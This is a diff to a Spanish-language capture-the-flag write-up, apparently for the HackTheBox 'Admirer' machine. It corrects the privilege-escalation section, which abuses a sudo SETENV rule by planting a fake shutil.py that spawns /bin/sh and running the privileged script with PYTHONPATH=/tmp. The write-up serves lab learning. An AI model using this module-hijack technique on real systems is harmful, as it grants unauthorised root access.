@@ -119,15 +119,15 @@ sudo -l
 
 ```text
 User waldo may run the following commands on admirer:
-    (ALL) SETENV: NOPASSWD: /opt/scripts/backup.py
+    (ALL) SETENV: NOPASSWD: /opt/scripts/admin_tasks.sh
 ```
 
-`SETENV` es la clave: permite pasar variables de entorno al proceso privilegiado. El script hace `import shutil`, y Python resuelve los módulos desde `PYTHONPATH` antes que desde la librería estándar.
+`SETENV` es la clave: permite pasar variables de entorno al proceso privilegiado. La regla es sobre `admin_tasks.sh`, no sobre `backup.py`; la opción 6 del menú lanza `backup.py`, que hace `import shutil`, y Python resuelve los módulos desde `PYTHONPATH` antes que desde la librería estándar.
 
 ```bash
 cat /opt/scripts/backup.py        # import shutil, make_archive(...)
 echo 'import os; os.system("/bin/sh")' > /tmp/shutil.py
-sudo PYTHONPATH=/tmp /opt/scripts/backup.py
+sudo PYTHONPATH=/tmp /opt/scripts/admin_tasks.sh   # opción 6
 ```
 
 ```text
